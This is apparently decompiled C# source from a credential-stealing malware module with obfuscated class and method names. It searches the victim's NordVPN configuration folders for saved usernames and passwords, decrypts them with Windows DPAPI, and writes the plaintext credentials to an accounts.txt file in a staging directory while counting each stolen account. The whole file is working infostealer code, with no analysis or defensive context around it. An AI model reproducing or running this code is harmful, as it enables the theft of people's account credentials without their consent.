using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

internal class Class45
{
	private static string smethod_0(string string_0)
	{
		try
		{
			return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(string_0), (byte[])null, (DataProtectionScope)1));
		}
		catch
		{
			return "";
		}
	}

	public static void smethod_1()
	{
		string string_ = Class38.string_11;
		DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Class52.string_4, "NordVPN"));
		if (!directoryInfo.Exists)
		{
			return;
		}
		try
		{
			DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
			for (int i = 0; i < directories.Length; i++)
			{
				DirectoryInfo[] directories2 = directories[i].GetDirectories();
				for (int j = 0; j < directories2.Length; j++)
				{
					string text = Path.Combine(directories2[j].FullName, "user.config");
					if (File.Exists(text))
					{
						Directory.CreateDirectory(string_ + "\\VPN\\NordVPN\\");
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(text);
						string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value")!.InnerText;
						string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value")!.InnerText;
						if (innerText != null && !string.IsNullOrEmpty(innerText) && innerText2 != null && !string.IsNullOrEmpty(innerText2))
						{
							string text2 = smethod_0(innerText);
							string text3 = smethod_0(innerText2);
							Class36.int_13++;
							File.AppendAllText(string_ + "\\VPN\\NordVPN\\\\accounts.txt", "Username: " + text2 + "\nPassword: " + text3 + "\n\n");
						}
					}
				}
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}
}
